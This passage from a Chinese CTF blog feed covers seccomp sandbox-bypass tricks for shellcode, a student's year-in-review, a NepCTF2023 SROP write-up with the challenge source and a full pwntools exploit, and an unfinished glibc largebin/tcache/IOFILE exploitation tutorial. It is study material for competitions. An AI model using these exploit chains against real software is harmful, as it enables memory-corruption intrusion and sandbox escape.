        <content type="html"><![CDATA[<blockquote><p>最近打了挺多比赛，碰到一些比较有意思的题和方法</p></blockquote><p>shellcode的题挺多，往往都是加了一些乱七八糟的限制。一般要么限制字符，要么开沙箱。限制字符基本上就通过手搓<del>我不会</del>或者alpha3之类的工具实现，这里讲一些绕过沙箱的办法。</p><h1 id="切换架构"><a href="#切换架构" class="headerlink" title="切换架构"></a>切换架构</h1><p>题目不仅禁止getshell，甚至限制了orw，如果沙箱没有对系统架构进行检查，就可以使用切换架构的方式。</p><p>原理是沙箱通过检测系统调用号判断是否放行，而64位和32位架构下的系统调用号又不相同，切换到另一种架构，就能实现绕过黑名单检查</p><p>这种手法听起来很炫酷，操作却相当简单</p><p>程序运行时的架构，是由<code>cs</code>寄存器控制的。<code>cs=0x23</code>为32位模式，<code>cs=0x33</code>为64位模式。而<code>retfq</code>指令就能实现对<code>cs</code>的赋值</p><p><code>retfq</code>包含<code>ret</code>和<code>pop cs</code>两步，也就是先后pop <code>rip</code>和<code>cs</code>，所以一般可以像这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, 0x40404040 #arbitrary stack</span><br><span class="line">push 0x23 #or 0x33</span><br><span class="line">push 0x401145 #next shellcode</span><br><span class="line">retfq</span><br></pre></td></tr></table></figure><p>注意这里需要设置<code>rsp</code>，这是因为切换到32位时，寄存器也会被切成32位，所以需要预先调整栈顶的指针</p><p>另外我在操作时发现<code>ret</code>后的地址似乎有一定要求。起初我直接跳到下一条shellcode上，但会在retfq时崩溃，后来我<code>ret</code>到代码段里调用shellcode的地址，再提前设置好寄存器，顺利解决了这个问题</p><h1 id="者行孙"><a href="#者行孙" class="headerlink" title="者行孙"></a>者行孙</h1><p><del>你就说是不是一个东西吧</del></p><p>没有open的可以用openat代替</p><p>没有read的可以用pread64&#x2F;writev代替</p><p><a href="https://evian-zhang.github.io/introduction-to-linux-x86_64-syscall/src/filesystem/read-pread64-readv-preadv-preadv2.html">read, pread64, readv, preadv, preadv2系统调用</a></p><p>这么玩就没意思了</p><h1 id="使用socket"><a href="#使用socket" class="headerlink" title="使用socket"></a>使用socket</h1><p>有空看看</p><p><a href="http://blog.eonew.cn/2019-06-03.%E5%8F%8D%E5%90%91shellcode.html">EX大佬的博客</a></p><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>挺有趣的做法，找时间再详细研究下</p><p><a href="https://m1ku.in/archives/737">m1ku大佬的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>摸</title>
      <link href="/2023/08/27/%E6%91%B8/"/>
      <url>/2023/08/27/%E6%91%B8/</url>
      
        <content type="html"><![CDATA[<p>在电专摸了一年，不知不觉已经成了老油条的形状</p><p>大一整体处于一个比较迷茫的状态。开学时，机缘巧合下碰见了凝聚的招新赛，靠着热情冲了一个月，以pwn手的身份进入，随后就开始<strong>长达一个半学期</strong>的摸鱼期。期间或是卷分数（集电学院的风气懂的都懂），或是搞一些乱七八糟的比赛（也没有什么成绩），更多的时候，记忆缺失，大抵是在摸鱼罢</p><p>后来大一下，去了趟ASC的观摩，认识了一些凝聚的学长和Beetoven，还认识了南昌大学的cs佬。突然觉得，搞这些也挺有意思。此后开始参与更多凝聚的活动（并捡起所剩不多的pwn知识</p><p>接着就是国赛初赛，人生第二次来到工作室，社恐得宛如一个新生。好在初赛有些简单题，挺适合我这种招新赛水平选手康复。最后还是顺利进了复赛</p><p>复赛的时候连堆都不会，纯fw，挺可惜，还是和Casio3组的队。事后痛定思痛，决定以后不摸了</p><p>此时的我怎么也想不到，一个月之后，我会在讲台上给人讲高版本堆利用（</p><p>培训前还有个小插曲，<del>因为军训的某种神必力量</del>，鄙人全身起疹子在医院躺了一周</p><p>暑假期间打了一些比赛，<del>感觉我怎么什么都不会</del>感觉我的二进制之旅才刚刚开始</p><hr><p>摸过来的这一年，成绩不上不下，好在没有掉出保研线。二进制依旧是一个新人的水平，想到马上又要迎接下一届新人，不禁感到汗颜。</p><p>最近和学长们聊天比较多，对自己的未来逐渐也有了一些规划。目前主要精力还是会放在二进制上，并开始涉足密码学</p><p>毕竟是新学期，还是立几个flag吧（什么？哪里有flag？我直接cat）</p><ul><li><input disabled="" type="checkbox"> 养成写博客输出知识的习惯，尝试英文写作</li><li><input disabled="" type="checkbox"> 多参加ctf，丰富经历</li><li><input disabled="" type="checkbox"> 学习内核漏洞利用</li><li><input disabled="" type="checkbox"> 不熬夜，多锻炼</li></ul>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SROP初见杀-NepCTF2023</title>
      <link href="/2023/08/12/SROP/"/>
      <url>/2023/08/12/SROP/</url>
      
        <content type="html"><![CDATA[<p>这次比赛第一题就是很明显的<strong>SROP</strong>，正好啥也不会，学习了一下</p><h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><p><strong>SROP</strong>全称为<strong>Sigreturn Oriented Programming</strong>，其攻击核心为通过伪造一个<strong>Signal Frame</strong>（以下简称<strong>sigFrame</strong>）在栈上，同时触发<strong>sigreturn</strong>系统调用，让内核为我们恢复一个sigFrame所描述的进程，如一个shell、一个wrtie系统调用打印栈地址等，同时通过对sigFrame中rsp和rip的修改，连接多个sigFrame，可通过多次触发sigreturn系统调用，依次恢复多个sigFrame，实现不同的功能，构成SROP攻击。一个sigFrame可理解为一个进程被挂起时，用于保存进程的数据结构，当进程恢复时，通过触发sigreturn来恢复sigFrame，从而恢复一个进程。</p><p>以上内容是抄的，说白了就是：进程受到一个signal进入中断，内核会保存上下文（寄存器状态之类的，这个上下文存在<strong>sigFrame</strong>中），随后进入用户态执行处理函数，处理完最后又进入内核态恢复上下文</p><p><img src="/../img/SROP.assets/image-20230812205434238.png" alt="image-20230812205434238"></p><p>而这个保存上下文的sigFrame完全在<strong>用户空间</strong>，并且内核对进程挂起时保存的sigFrame以及恢复时还原的sigFrame<strong>没有做任何关联</strong>，这导致sigFrame可以被伪造</p><p><img src="/../img/SROP.assets/image-20230812205639153.png" alt="image-20230812205639153"></p><p>上图是64位的sigFrame结构。恢复上下文之前，会调用处理函数<strong>Signal Handler</strong>，该函数最后一个指令是<code>ret</code>，此时<code>rsp</code>正好指向sigFrame的栈顶，也就是存有函数<code>rt_sigreturn</code>地址的位置。随后调用<code>rt_sigreturn</code>，通过该函数完成上下文的恢复。</p><p>因此，我们可以在<code>rsp</code>附近伪造sigFrame，通过调用<code>rt_sigreturn</code>完成寄存器的布置</p><p>调用可以直接写内存，更常见的是进行调用号为0xf的系统调用</p><blockquote><p>小技巧：系统调用号可以通过<code>cat /usr/include/asm/unistd_64.h</code>查看</p></blockquote><p>另外，pwntools中的<code>SigreturnFrame()</code>可以方便完成寄存器的布置</p><h1 id="Nepctf2023-SROP"><a href="#Nepctf2023-SROP" class="headerlink" title="Nepctf2023-SROP"></a>Nepctf2023-SROP</h1><p>源码都喂我嘴里了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x30</span>]=<span class="string">&quot;welcome to NepCTF2023!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seccomp</span><span class="params">()</span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="type">char</span> bd[<span class="number">0x30</span>];</span><br><span class="line">     seccomp();</span><br><span class="line">     syscall(<span class="number">1</span>,<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br><span class="line">     <span class="keyword">return</span> syscall(<span class="number">0</span>,<span class="number">0</span>,bd,<span class="number">0x300</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然需要打一个orw</p><p>注意这里有一个坑，众所周知，<code>syscall</code>的系统调用号是通过<code>rax</code>传递，然而我们反汇编之后</p><p><img src="/../img/SROP.assets/image-20230812211245122.png" alt="image-20230812211245122"></p><p>令人意外的是，这里的<code>syscall</code>都是通过<code>rdi</code>传调用号的，猜测与这里使用<code>call syscall</code>而非直接使用<code>syscall</code>有关</p><p>既然不用<code>rax</code>传调用号，那题目中的<code>sys()</code>函数也就没有意义了，好在能找到<code>pop rdi</code>的gadgets，可以任意布置</p><p>我的思路是，先打一次srop，把flag写到bss段，顺便把栈迁移过去，随后挨着打orw</p><p><strong>伪造sigFreame</strong>时需要<strong>格外注意</strong></p><p><code>cs</code> <code>gs</code> <code>fs</code> <code>ss</code>需要<strong>保持不变</strong>！否则会报错！</p><p>本人就在这里排查了很久</p><p>可以按照如下写法</p><p><code>sig.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)</code></p><p>从左往右依次为<code>cs</code> <code>gs</code> <code>fs</code> <code>ss</code></p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *0x0000000004007AE\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;nepctf.1cepeak.cn&quot;</span></span><br><span class="line">port = <span class="number">30551</span></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line">sig = <span class="number">0x0000000000400750</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">syscall = <span class="number">0x00000000004007A8</span></span><br><span class="line">buf = <span class="number">0x0000000000601020</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0x38</span> +p64(pop_rdi)+p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span class="number">0</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x1000</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x10</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">2</span></span><br><span class="line">sig.rsi = buf</span><br><span class="line">sig.rdx = <span class="number">0</span></span><br><span class="line">sig.rcx = <span class="number">0</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x120</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x120</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x120</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x120</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span class="number">3</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x240</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x240</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">1</span></span><br><span class="line">sig.rsi = <span class="number">1</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOFILE exploit</title>
      <link href="/2023/08/11/IOFILE-exploit/"/>
      <url>/2023/08/11/IOFILE-exploit/</url>
      
        <content type="html"><![CDATA[<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>前段时间给人讲课，碰上了高版本glibc堆利用这部分。刚好自己啥也不会，于是花了些时间好好学了下IOFILE在高版本下的利用。好在最后没有翻车，自己在备课期间也独立完成了一些经典例题，算是有了一些粗浅的收获。现以一个初学者的目光重新梳理学习IOFILE利用的整个过程。</p><h1 id="辅助手法"><a href="#辅助手法" class="headerlink" title="辅助手法"></a>辅助手法</h1><p>IOFILE的利用，通常需要伪造IOFILE结构体，随后通过一些方式触发IO流，使得程序调用我们劫持后的IO函数，从而达成getshell或者orw。所以IOFILE exploit实际上是整个利用环节的<strong>最后一步</strong>，要达成伪造IOFILE结构体、触发IO链，往往需要借助一些<strong>辅助手法</strong>。</p><p>在高版本下，最为常用的是<strong>largebin attack</strong>，该手法需要一个UAF，达成后能在任意目标地址写上堆地址，简单暴力，用过都说好。另一种是<strong>tcache stashing unlink</strong>，该手法在house of pig中被使用，要求程序使用calloc，并存在UAF，通常结合largebin attack达成将目标地址分配为chunk。</p><h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h2><blockquote><p>原先存在两条利用链，其中一条在高版本下已被封禁，查找资料时需甄别。</p></blockquote><p>首先我们需要了解largebin的结构：</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811162248700.png" alt="image-20230811162248700"></p><p>一个large bin中包含<strong>一定范围大小</strong>的large chunk，如第一个largebin大小范围为(0x400-0x430)，第二个为(0x440-0x470)。同一个bin中，相同大小的chunk之间用<code>fd</code>、<code>bk</code>相连，不同大小用<code>fd_nextsize</code>、<code>bk_nextsize</code>相连，且自动由大到小排序，如上图中左边的大于右边。</p><p>当有新的chunk加入largebin，且大小小于该bin中已有的chunk时，会进行如下操作（精简版）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">victim_index = largebin_index (size);</span><br><span class="line"><span class="comment">/*查找该size属于的bin范围，返回index*/</span></span><br><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line"><span class="comment">/*取得bin*/</span></span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//critical1!!!</span></span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//critical2!!!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该操作实际上完成了一个简单的将chunk加入双向链表的过程，可以逐步手动模拟加深理解</p><p>该操作缺失对双向链表完整性的检查，可以加以利用</p><p>我们假设largebin中仅存在chunk0，现在准备将chunk1加入largebin，且chunk0 &gt; chunk1。我们把chunk0的<code>bk_nextsize</code>修改为<code>[target-0x20]</code>(即<code>target</code>目标地址位于以<code>[target-0x20]</code>开头的chunk的<code>fd_nextsize</code>处)</p><p>修改完成后，我们将chunk1入链，重点关注上述代码片段中注释的部分。critical1处 <code>victim-&gt;bk_nextsize = (&amp;target)-4)</code>，critical2处 <code>(&amp;target)-4)-&gt;fd_nextsize = victim</code>，即<code>*target = victim</code>。目标达成</p><p>由此可见，largebin attack的利用相当简单，只需一个UAF即可完成</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><p>glibc加入tcache后，当从smallbin中取出chunk时，如果smallbin中仍有chunk且对应tcache未填满，则会将smallbin中剩余chunk全部依次放入对应tcache中。而在该过程中，只对从smallbin中取出的chunk进行了完整性检查，后续chunk均没有。该手法则利用了这一漏洞。</p><p>以下为将smallbin中chunk放入tcache的代码片段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="comment">//只对第一个chunk进行了完整性检查，后面进入循环，无检查</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">bck = tc_victim-&gt;bk;</span><br><span class="line">...</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"><span class="comment">//将其放入到Tcache中</span></span><br><span class="line">tcache_put (tc_victim, tc_idx);</span><br></pre></td></tr></table></figure><p>假设smallbin中只存在两个chunk，先入的为chunk0，后入的为chunk1，根据smallbin的<strong>FIFO</strong>原则，取出时先取出chunk0</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811170105495.png" alt="image-20230811170105495"></p><p>同时令对应大小的tcache中已填入5个chunk</p><p>此时将chunk1的<code>bk</code>位修改为目标地址<code>target</code>（不破坏<code>fd</code>），并利用其他手法使得<code>[target+0x8]</code>处为一个指向<strong>可写内存</strong>的指针。把<code>target</code>看作一个chunk的用户指针，则<code>[target+0x8]</code>为<code>bk</code>位。此处令其可写是因为进行该攻击时会向该指针指向的地址处写一个值，如果不可写的话程序会报错。用largebin attack将此处覆盖为可写的堆地址是一种常见操作</p><p>此时，我们用<code>calloc</code>函数将chunk0申请出来。<code>calloc</code>具有跳过tcache申请chunk的性质，所以此处只能用<code>calloc</code>。之后chunk1会加入tcache，chunk1的bk指向的<code>target</code>也会加入tcache。如果我们使用<code>malloc</code>，根据tcache <strong>LIFO</strong>的性质，就能将<code>target</code>申请出来。</p><h1 id="IOFILE及相关结构"><a href="#IOFILE及相关结构" class="headerlink" title="IOFILE及相关结构"></a>IOFILE及相关结构</h1><h2 id="IO-FILE-PLUS"><a href="#IO-FILE-PLUS" class="headerlink" title="_IO_FILE_PLUS"></a>_IO_FILE_PLUS</h2><p>程序在进行<strong>IO操作</strong>时，会用到IOFILE相关的结构。例如众所周知的<code>stdin</code>、<code>stdout</code>、<code>stderr</code>，都是指向IO结构体的指针。当打开一个文件时，程序需要记录文件的输入输出缓冲区等内容，于是需要一个<code>_IO_FILE</code>结构体进行记录。除此之外，对文件进行的各种操作形成了一张张函数虚表，文件需要一个指针记录对应的函数虚表，该指针被定义为<code>_IO_jump_t</code>类型。<code>_IO_FILE</code> 结构体和虚表指针<code>_IO_jump_t</code>形成了一个称为<code>_IO_FILE_plus</code>的结构体，它的定义是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>常见的<code>_IO_FILE_plus</code>结构体有<code>_IO_2_1_stderr</code>、<code>_IO_2_1_stdout</code>、<code>_IO_2_1_stdin</code>，前面提到的<code>stdin</code>等就是指向这些对应<code>_IO_FILE_plus</code>结构体的指针</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811172846782.png" alt="image-20230811172846782"></p><p>可以通过gdb的<code>p</code>指令查看</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173045845.png" alt="image-20230811173045845"></p><p>此外，存在一个指向<code>_IO_FILE_plus</code>结构体的<code>_IO_list_all</code>指针，通常情况下指向<code>_IO_2_1_stderr</code></p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173332086.png" alt="image-20230811173332086"></p><p>每个<code>_IO_FILE</code>结构体中都存在一个<code>_chain</code>指针，指向下一个<code>_IO_FILE_plus</code>结构体。通常情况，表示如下：</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173606405.png" alt="image-20230811173606405"></p><p>当有新文件被打开时，对应的<code>_IO_FILE_plus</code>结构体就会被插入到<strong>链首</strong>。</p><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><p>以下是<code>_IO_FILE</code>结构体的源码，看起来可能有些头大，重点需要了解的是几个<strong>缓冲区的指针</strong>、<code>_chain</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 